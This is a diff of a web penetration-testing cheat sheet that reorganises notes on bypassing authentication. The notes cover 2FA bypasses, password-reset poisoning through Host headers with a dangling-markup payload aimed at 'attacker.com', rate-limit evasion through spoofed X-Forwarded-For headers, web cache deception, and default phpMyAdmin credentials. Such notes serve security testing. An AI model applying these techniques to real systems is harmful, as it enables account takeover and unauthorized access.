@@ -1215,41 +1215,46 @@ xp_cmdshell 'COMMAND';
 
 ### <ins>Authentication vulnerabilities</ins>
 
-- Multi-factor authentication
-  - Response manipulation, try to intercept the response and modify the status to `200`
-  - Status code manipulation, change the code from `4xx` to `200`
-  - 2FA code leakage in the response
-  - JS File Analysis
-  - 2FA Code Reusability
-  - Lack of Bruteforce protection
-  - The 2FA code can be used for any user
-  - CSRF on 2FA disabling
-  - Password reset disable 2FA
-  - Bypass 2FA with null or `000000`
-  - Access the content directly
-  - Login with Oauth to bypass 2FA
-  - If you get logged-out after failed attempts, use macros with Burp
-- Password reset
-  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
-  - Try with headers like `X-Forwarded-Host:`
-  - Via dangling markup
-    - `Host: victim.com:'<a href="//attacker.com/?`
-  - Insert two emails, like:
-    - `email1@service.com;email2@service.com`
-    - `email:["email1@service.com","email2@service.com"]`
+**Multi-factor authentication**
+- Response manipulation, try to intercept the response and modify the status to `200`
+- Status code manipulation, change the code from `4xx` to `200`
+- 2FA code leakage in the response
+- JS File Analysis
+- 2FA Code Reusability
+- Lack of Bruteforce protection
+- The 2FA code can be used for any user
+- CSRF on 2FA disabling
+- Password reset disable 2FA
+- Bypass 2FA with null or `000000`
+- Access the content directly
+- Login with Oauth to bypass 2FA
+- If you get logged-out after failed attempts, use macros with Burp
+
+**Password reset**
+- Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
+- Try with headers like `X-Forwarded-Host:`
+- Via dangling markup
+  - `Host: victim.com:'<a href="//attacker.com/?`
+- Insert two emails, like:
+  - `email1@service.com;email2@service.com`
+  - `email:["email1@service.com","email2@service.com"]`
+
+**Rate-limit**
+- Bypass with `X-Forwarded-For:127.0.0.1-1000`
+- IP rotating, you can use
+  - [mubeng](https://github.com/kitabisa/mubeng)
+  - [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
+- Log in into a valid account to reset the rate-limit
+
+**Web Cache Deception**
+- Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
+- Victim click on it, the CDN cache the page
+- Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim
+
+**Misc tests**
 - [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
 - [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
-- Rate-limit
-  - Bypass with `X-Forwarded-For:127.0.0.1-1000`
-  - IP rotating, you can use
-    - [mubeng](https://github.com/kitabisa/mubeng)
-    - [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
-  - Log in into a valid account to reset the rate-limit
-- Test remember me functionality
-- Web Cache Deception
-  - Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
-  - Victim click on it, the CDN cache the page
-  - Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim
+- Test "remember me" functionality
 - PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
 - Replace password with a list of candidates, example
   ```JSON
@@ -1261,7 +1266,7 @@ xp_cmdshell 'COMMAND';
    ...
   ```
 - Search for [Open Redirect](#open-redirection) in login and register
-
+- For phpMyAdmin, check default credential `root` and blank password
 
 ### <ins>Directory Traversal</ins>
 
